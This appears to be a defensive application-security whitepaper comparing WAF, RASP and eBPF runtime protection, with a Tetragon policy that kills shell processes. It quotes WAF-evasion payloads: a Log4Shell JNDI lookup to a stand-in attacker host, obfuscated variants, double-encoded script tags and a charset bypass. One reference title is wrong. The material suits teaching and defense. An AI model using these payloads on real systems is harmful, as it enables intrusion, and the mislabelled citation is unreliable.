---
title: "Runtime Application Protection: Comparing WAF and RASP Architectures, eBPF Filtering, and Evasion Mitigation"
type: appsec
tags: [WAF, RASP, eBPF, Runtime Security, Threat Detection]
date: 2026-06
readingTime: 16
---

# Runtime Application Protection: Comparing WAF and RASP Architectures, eBPF Filtering, and Evasion Mitigation

## Executive Summary

Protecting web applications from modern exploits requires defending against highly sophisticated evasion techniques. Traditionally, organizations relied on Web Application Firewalls (WAFs) as their primary line of defense. WAFs inspect incoming HTTP traffic at the network edge, matching payloads against known attack signatures. While WAFs are effective for blocking common scanner traffic, they are blind to the application's internal state. Attackers exploit this limitation by obfuscating payloads to bypass WAF filters, leading to compromises on backend servers.

At scale, relying solely on signature-based WAFs creates a security gap. Web applications require Runtime Application Self-Protection (RASP) and eBPF-based system call auditing. These technologies run inside the application runtime or at the kernel level, analyzing what the application is actually doing rather than just inspecting the network inputs. This whitepaper compares WAF and RASP architectures, details bypass techniques using character encoding, explains how eBPF secures runtime environments, and outlines best practices for virtual patching.

---

## Threat Model and Attack Surface

The runtime attack surface encompasses incoming HTTP requests, application memory, execution thread lifecycles, and host system calls.

```
       [ HTTP Payload with Obfuscated Command ]
                          │
                          ▼
            [ Edge WAF Signature Check ]
                          │
       ┌──────────────────┴──────────────────┐
       ▼ (Evasion: Double URL Encoded)       ▼ (Plain Text Signature Match)
[ Bypass: WAF forwards request ]      [ Blocked: Connection Terminated ]
       │
       ▼
[ Web Application Server Processes Request ]
       │
       ▼ (Decodes payload & executes system call)
[ RASP / eBPF System Call Inspection ]
       │
       ▼
[ BLOCK: Unauthorized process creation (sh / bash) ]
```

### Threat Vectors and Kill-Chains

1. **WAF Evasion via Obfuscation**:
   - *Adversary Goal*: Execute remote commands on the application host.
   - *Attack Vector*: An attacker exploits a Remote Code Execution (RCE) vulnerability (such as Log4Shell). Because the WAF matches patterns in incoming HTTP requests, the attacker obfuscates the request using nested formatting or character set encoding (e.g. `${${lower:j}ndi:ldap://attacker.com/a}`). The WAF fails to match the string and forwards the request. The application server decodes the payload, executing the malicious command.
2. **Dynamic Command Injection**:
   - *Adversary Goal*: Spawn an interactive shell on the application server.
   - *Attack Vector*: An application has a file download feature that passes user inputs directly to a shell wrapper. An attacker injects command separators (`&&` or `;`) to execute arbitrary shell commands. Because this occurs within valid application execution parameters, network-level WAFs cannot detect the exploit.
3. **Privilege Escalation via Host System Call Abuse**:
   - *Adversary Goal*: Escape container boundaries to read host files.
   - *Attack Vector*: An attacker exploits a vulnerability in a backend Node.js or Python application to execute system calls. They trigger `execve` to execute a binary, or try to open a sensitive system file (like `/etc/passwd`) using `openat`.

---

## Deep Technical Body

### WAF vs. RASP Architectural Comparison

To design a resilient runtime defense, combine network-edge inspection with internal runtime validation:

| Feature | Web Application Firewall (WAF) | Runtime Application Self-Protection (RASP) |
| :--- | :--- | :--- |
| **Execution Point** | Network edge (Reverse proxy, Load balancer). | Inside the application process (JVM, CLR, Node agent). |
| **Contextual Awareness** | **Low**: Only sees HTTP/S headers, cookies, and raw payloads. | **High**: Inspects application variables, database queries, and system calls. |
| **Evasion Vulnerability** | **High**: Obfuscation, encoding shifts, and parser differentials can bypass signatures. | **Low**: Analyzes the final payload immediately before execution, after all decoding. |
| **Performance Overhead** | Minimal impact on the application server. | Increases CPU usage and memory footprint of the application process. |
| **Primary Use Cases** | Blocking DDoS attacks, bot traffic, and virtual patching. | Preventing SQL injection, RCE, and insecure deserialization. |

### WAF Evasion via Encoding Shifts
WAFs parse payloads using standard decoders. If an attacker passes a payload using an encoding format the WAF does not decode—but the backend application server does—the WAF will fail to match the attack signature.

#### Double URL Encoding
An attacker sends a payload where special characters are double encoded:
`%253cscript%253e`
The WAF decodes it once to `%3cscript%3e` and passes it, finding no signature matches. The backend application server decodes it again to `<script>`, executing cross-site scripting.

#### Character Set Mismatches
An attacker sends a request specifying `charset=ibm290` in the `Content-Type` header. If the WAF does not support the IBM290 character set, it cannot parse the request body. However, if the backend server (e.g. WebSphere) supports the character set, it decodes the payload and executes the command, bypassing the WAF.

### How RASP Protects the Runtime: The Log4Shell Mitigation Case Study
During the Log4Shell (CVE-2021-44228) exploit, attackers bypassed WAF signatures using endless string obfuscations:
`$ {jndi:ldap:...}`
`${${lower:j}ndi:...}`
`${upper:j}ndi:...`

#### The RASP Defense Mechanism
RASP does not match signatures in the incoming HTTP request. Instead, it hooks into the Java JNDI lookup methods (`javax.naming.directory.DirContext.lookup`). When the application resolves the LDAP query, the RASP agent inspects the final resolved URL parameter. If the lookup URL points to an untrusted external IP address, the RASP agent intercepts the execution thread, throws a security exception, and blocks the request.

---

## Defensive Architecture

A secure runtime architecture combines edge WAF analysis, RASP code instrumentation, and eBPF-based kernel system call auditing.

### Architecture Topology: Defense-in-Depth Web Application Inspection

```
[ Incoming HTTP Request ] ────> [ Cloud WAF / Edge WAF ]
                                       │
                              ( Blocks Bot Scans )
                                       │
                                       ▼
                     [ API Gateway / Load Balancer ]
                                       │
                                       ▼
                       [ Application Worker Pods ]
                                       │
                 ┌─────────────────────┴─────────────────────┐
                 ▼                                           ▼
       [ RASP Agent (JVM/CLR) ]                     [ eBPF Sensor (Kernel) ]
                 │                                           │
  ( Hooks DB & File System calls )              ( Audits execve / socket creation )
                 │                                           │
                 ▼                                           ▼
         [ Block Exploit ]                           [ Terminate Pod ]
```

### eBPF System Call Filtering Policy
Configure eBPF runtime security engines (like Cilium Tetragon) to monitor and block unauthorized system calls (such as launching a shell process from a web server).

#### Tetragon TracingPolicy Configuration
This policy blocks any Node.js container from spawning a shell execution process:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-shell-execution-in-node
  namespace: prod
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string" # Path of the executable binary
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/bin/sh"
        - "/bin/bash"
      matchNamespaces:
      - "prod"
      matchActions:
      - action: Sigkill # Instantly terminate the process
```

---

## Tooling and Implementation

Implement a robust runtime protection layer using the following tools:

1. **ModSecurity / AWS WAF**: Deploy ModSecurity (OWASP Core Rule Set) or cloud-native WAFs to detect and block common exploits at the network edge.
2. **Open-Source RASP (OpenRASP)**: Integrate OpenRASP (backed by Baidu) or equivalent commercial RASP agents into your application runtimes. This dynamically inspects SQL queries, file operations, and network connections.
3. **Cilium Tetragon / Falco**: Deploy eBPF sensors in your Kubernetes clusters to audit system call execution in real time. Tetragon can kill processes immediately when they violate security policies, while Falco alerts on suspicious host activities.

---

## Runtime Protection Audit Checklist

| Item | Focus Area | Verification Step / Command | Target State |
| :--- | :--- | :--- | :--- |
| 1 | WAF Rule Configuration | Verify that the edge WAF utilizes the latest OWASP Core Rule Set (CRS). | Common web exploits are blocked at the perimeter. |
| 2 | RASP Agent Status | Check if the JVM, Node, or .NET container utilizes an active RASP agent. | The agent is injected into the container runtime startup script. |
| 3 | System Call Isolation | Verify if containers run in read-only filesystems. | `readOnlyRootFilesystem: true` is configured in pod specs. |
| 4 | eBPF Audit Logging | Check if kernel system call alerts are forwarded to the SIEM. | Tetragon or Falco logs are monitored in real time. |
| 5 | Virtual Patching | Verify if rules exist to block newly disclosed CVEs. | Custom WAF rules are deployed to block new exploits before code patches are applied. |
| 6 | Payload Size Limits | Audit request size constraints on the load balancer. | Large payloads are rejected to prevent buffer overflow attacks. |

---

## References

* *Bypassing Web Application Firewalls using Encoding*: [OWASP Presentation](https://owasp.org/www-pdf-archive/OWASP_AppSec_Research_2010_Bypassing_WAFs_by_Vclient.pdf)
* *Cilium Tetragon Runtime Security Engine*: [Cilium Documentation](https://tetragon.cilium.io/docs/)
* *NIST Special Publication 800-204C (Message-Level Security in Microservices)*: [NIST SP 800-204C](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204C.pdf)
